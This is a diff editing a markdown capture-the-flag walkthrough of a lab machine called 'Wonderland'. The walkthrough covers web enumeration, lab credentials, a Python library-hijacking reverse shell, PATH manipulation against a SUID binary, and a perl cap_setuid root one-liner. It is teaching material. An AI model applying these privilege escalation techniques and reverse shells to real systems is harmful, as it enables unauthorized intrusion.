@@ -11,9 +11,9 @@ tags:
   - perl
 ---
 
-| Difficulty |
-| ---------- |
-|   Medium   |
+| Difficulty |  |  IP Address   |  |
+| :--------: |--| :-----------: |--|
+|   Medium   |  |   10.10.94.9  |  |
 
 ---
 
@@ -29,12 +29,9 @@ sudo nmap -sC -sV -vv -T4 -p- 10.10.94.9
 
 ![screenshot1](../assets/images/wonderland/screenshot1.png)
 
-Looks like we have **two** ports open:
+Looks like we have 2 ports open: **22 (SSH)** and **80 (HTTP)**
 
-* **Port 22** - SSH Server
-* **Port 80** - HTTP Web server
-
-Let's take a look at that HTTP Web server.
+Let's take a look at the HTTP Web server:
 
 ![screenshot2](../assets/images/wonderland/screenshot2.png)
 
@@ -46,25 +43,21 @@ We can run a `gobuster` directory scan on the web server. This will help us enum
 gobuster dir -u http://10.10.94.9/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
 ```
 
-**Results:**
-
 ![screenshot3](../assets/images/wonderland/screenshot3.png)
 
-From the results, we can see some interesting directories:  **/r**, **/poem** and **/img**. Let's take a look at the **/r** directory first.
+From the results, we can see some interesting directories:  **/r**, **/poem** and **/img**. Let's take a look at the **/r** directory first:
 
 **/r directory**
 
 ![screenshot5](../assets/images/wonderland/screenshot5.png)
 
-Visiting **/r** brings us to another page with the text "**Keep Going**". Since this room is based on Alice in Wonderland, and Alice falls down a rabbit hole in the movie, I'm going to assume that we keep finding more hidden directories from here.
+Visiting **/r** brings us to another page with the text "Keep Going". Since this room is based on Alice in Wonderland, and Alice falls down a rabbit hole in the movie, I'm going to assume that we keep finding more hidden directories from here.
 
-We run another Gobuster scan on this specific directory.
+We run another Gobuster scan on this specific directory:
 
 ```
 gobuster dir -u http://10.10.94.9/r/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
 ```
-
-**Results:**
 
 ![screenshot6](../assets/images/wonderland/screenshot6.png)
 
@@ -74,7 +67,7 @@ And we have another interesting directory: **/a**
 
 ![screenshot7](../assets/images/wonderland/screenshot7.png)
 
-From here, I figured that we can keep adding on more characters into the URL, eventually forming the word '**rabbit**'
+From here, I figured that we can keep adding on more characters into the URL, eventually forming the word '**rabbit**':
 
 ```
 http://10.10.94.9/r
@@ -93,23 +86,23 @@ Sure enough, **/r/a/b/b/i/t** brings us to a valid web page as well. Looking at 
 
 ![screenshot9](../assets/images/wonderland/screenshot9.png)
 
-We can find a set of credentials that will allow us to log into the SSH Server as the user 'alice'.
+We find a set of credentials that will allow us to log into the SSH Server as the user 'alice':
 
-\> **alice:HowDothTheLittleCrocodileImproveHisShiningTail**
+> alice : HowDothTheLittleCrocodileImproveHisShiningTail
 
 ![screenshot10](../assets/images/wonderland/screenshot10.png)
 
 Now that we have gained an initial foothold into our target machine, we can begin exploring.
 
-Let's first check out the **home directory** of alice:
+Let's first check out alice's home directory:
 
 ![screenshot11](../assets/images/wonderland/screenshot11.png)
 
 We have two files: **root.txt** and **walrus_and_the_carpenter.py**. However, there is no **user.txt** file to be found.
 
-As expected, we also do not have the permissions to open **root.txt** as it is owned by root.
+As expected, we also do not have the permissions to open root.txt as it is owned by root.
 
-From the **/home** directory, we can see that there are a few other users:
+From the /home directory, we can see that there are a few other users:
 
 ![screenshot12](../assets/images/wonderland/screenshot12.png)
 
@@ -119,9 +112,9 @@ Let's now check our **sudo privileges**. We can do this with the `sudo -l` comma
 
 ![screenshot13](../assets/images/wonderland/screenshot13.png)
 
-Interesting! It seems that we can run the **walrus_and_the_carpenter.py** script as the user **rabbit**.
+Interesting! It seems that we can run the **walrus_and_the_carpenter.py** script as the user 'rabbit'.
 
-Let's go ahead and take a look at the script.
+Let's go ahead and take a look at this script.
 
 **walrus_and_the_carpenter.py**
 
@@ -258,21 +251,15 @@ for i in range(10):
     print("The line was:\t", line)
 ```
 
-The script contains a really long string. It then uses the **random** Python library to print out a few random lines from the string.
-
-What's really important here is the use of the Python library: **random**. After doing some research online, I found a method to potentially escalate our privileges using a technique called **Python Library Hijacking**.
-
-A great article on this topic can be found [here](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8). 
+The script contains a really long string. It then uses the **random** Python library to print out a few random lines from the string. What's really important here is the use of the Python library: **random**. After doing some research online, I found a method to potentially escalate our privileges using a technique called [Python Library Hijacking](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8).
 
 Essentially, instead of targeting python scripts directly, we can target the libraries that they import instead. 
 
-We first use the following command to check our **PYTHONPATH**.
+We first use the following command to check our **PYTHONPATH**:
 
 ```
 python3 -c 'import sys; print(sys.path)'
 ```
-
-**Results:**
 
 ![screenshot14](../assets/images/wonderland/screenshot14.png)
 
@@ -292,9 +279,9 @@ In our case, there is something very interesting about our PYTHONPATH:
 
 The **''** actually signifies the current directory that the python script is in. Since the **''** entry is the highest on the list, it holds the most priority and Python will actually look at the current directory to check for any imported library files.
 
-With that in mind, we can create our own **random.py** file in the same directory as **walrus_and_the_carpenter.py**, which will open up a reverse shell instead of doing what the random library normally does. We'll use the reverse shell from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python).
+With that in mind, we can create our own **random.py** file in the same directory as walrus_and_the_carpenter.py, which will open up a reverse shell instead of doing what the random library normally does. We'll use the reverse shell from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python).
 
-We create **random.py** with a function called **'choice'**, as this function was used in **walrus_and_the_carpenter.py**.
+We create **random.py** with a function called **choice()**, as this function was used in walrus_and_the_carpenter.py.
 
 ```python
 import socket,os,pty
@@ -310,7 +297,7 @@ def choice(a):
 
 Next, we set up our netcat listener.
 
-Finally, we run **walrus_and_the_carpenter.py** with `sudo -u`.
+Finally, we run walrus_and_the_carpenter.py with `sudo -u`:
 
 ```
 sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
@@ -320,13 +307,15 @@ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 
 With that, we have gained access into rabbit's account!
 
-In Rabbit's home directory, we have an interesting binary file: **teaParty**
+In Rabbit's home directory, we have an interesting binary called **teaParty**:
 
 ![screenshot17](../assets/images/wonderland/screenshot17.png)
 
+teaParty is an ELF binary with the **SUID** and **SGID** bit set:
+
 ![screenshot21](../assets/images/wonderland/screenshot21.png)
 
-teaParty is an ELF binary with the **SUID** and **SGID** bit set.
+Let's see what teaParty does!
 
 ![screenshot18](../assets/images/wonderland/screenshot18.png)
 
@@ -342,7 +331,7 @@ After downloading the binary onto my local machine and loading it into Binary Ni
 
 As we can see, the binary runs the `date` command.
 
-However, it doesn't use the **absolute path** of the `date` binary! This is great for us as this means we can do some **path manipulation** to spawn a shell.
+However, it doesn't use the **absolute path** of the `date` binary! This is great for us as this means we can do some path manipulation to spawn a shell.
 
 To do so, we first create a new binary called **date** in a directory of our choice. Remember to make it executable by anyone.
 
@@ -351,19 +340,19 @@ echo '/bin/bash' > /tmp/date
 chmod 777 /tmp/date
 ```
 
-Next, we have to export the chosen directory into our **PATH** variable.
+Next, we have to export the chosen directory into our **PATH** variable:
 
 ```
 export PATH=$PATH:/tmp
 ```
 
-We can use `echo $PATH` to verify that our directory has been added.
+We can use `echo $PATH` to verify that our directory has been added:
 
 ![screenshot22](../assets/images/wonderland/screenshot22.png)
 
-Now, when the `date` command is called, the **/tmp** directory will be checked first for the date binary. This means that our own date binary will be executed, which will then spawn us a shell.
+In our case, when the `date` command is called, the **/tmp** directory will be checked first for the date binary. This means that our own date binary will be executed, which will then spawn us a shell.
 
-With that, we just have to run the teaParty binary again. As the SUID bit is set, the binary will run as a different user.
+With that, we just have to run the teaParty binary again. As the SUID bit is set, the binary will run as a different user:
 
 ![screenshot23](../assets/images/wonderland/screenshot23.png)
 
@@ -373,7 +362,9 @@ Hatter's home directory contains a **password.txt** file:
 
 ![screenshot24](../assets/images/wonderland/screenshot24.png)
 
-Looks like we have a password. I tried using this password to log into root, but it didn't work. I later found out that this is the password to hatter's account - **WhyIsARavenLikeAWritingDesk?**
+Looks like we have a password. I tried using this password to log into root, but it didn't work. I later found out that this is the password to hatter's account: 
+
+> WhyIsARavenLikeAWritingDesk?
 
 ---
 
@@ -385,9 +376,11 @@ While doing my research on capabilities, I came across this very useful [article
 
 The article goes into great detail on what capabilities are and how they differ from SUID. In essence, capabilities allow us to set very specific privileges to executable files, instead of SUID, which is binary in nature (either the file is privileged or not).
 
+**Common Capabilities:**
+
 ![screenshot25](../assets/images/wonderland/screenshot25.png)
 
-The table above shows some common capabilities. The one that is especially important to us is the **CAP_SETUID** capability, as this allows for the changing of **UID**, essentially allowing for a non-privileged user to change their UID to root.
+One capability that is especially important to us is the **CAP_SETUID** capability, as this allows for the changing of **UID**, essentially allowing for a non-privileged user to change their UID to root.
 
 To check which files have capabilities enabled, we use:
 
@@ -395,15 +388,13 @@ To check which files have capabilities enabled, we use:
 getcap -r / 2>/dev/null
 ```
 
-*`-r` option allows for recursive search*
+*(`-r` option allows for recursive search)*
 
 ![screenshot26](../assets/images/wonderland/screenshot26.png)
 
-From the results, we can see that **/usr/bin/perl** has the **cap_setuid+ep** capability! This means that it can be used to spawn a shell with root privileges (as its owner is root).
+From the results, we can see that `perl` has the `cap_setuid+ep` capability! This means that we can exploit it to spawn a shell with root privileges.
 
-The article actually provides the method to exploit the perl program as well.
-
-All we have to do navigate to **/usr/bin** and run:
+All we have to do is run:
 
 ```
 ./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
@@ -413,7 +404,7 @@ All we have to do navigate to **/usr/bin** and run:
 
 With that, we have successfully escalated our privileges and gained root!
 
-The user flag can be found in the **root home directory**.
+The **user flag** can be found in the /root:
 
 ![screenshot28](../assets/images/wonderland/screenshot28.png)
 
@@ -421,7 +412,7 @@ The user flag can be found in the **root home directory**.
 
 ### [ Escalate your privileges, what is the flag in root.txt? ]
 
-The root flag can be found in **alice's home directory**.
+The **root flag** can be found in alice's home directory:
 
 ![screenshot29](../assets/images/wonderland/screenshot29.png)
 
@@ -439,7 +430,7 @@ One of the images in the **/img** directory on the HTTP web server actually cont
 
 The image is **white_rabbit_1.jpg**.
 
-We can use `steghide` to try and extract the data.
+We can use `steghide` to try and extract the data:
 
 ```
 steghide extract -sf white_rabbit_1.jpg
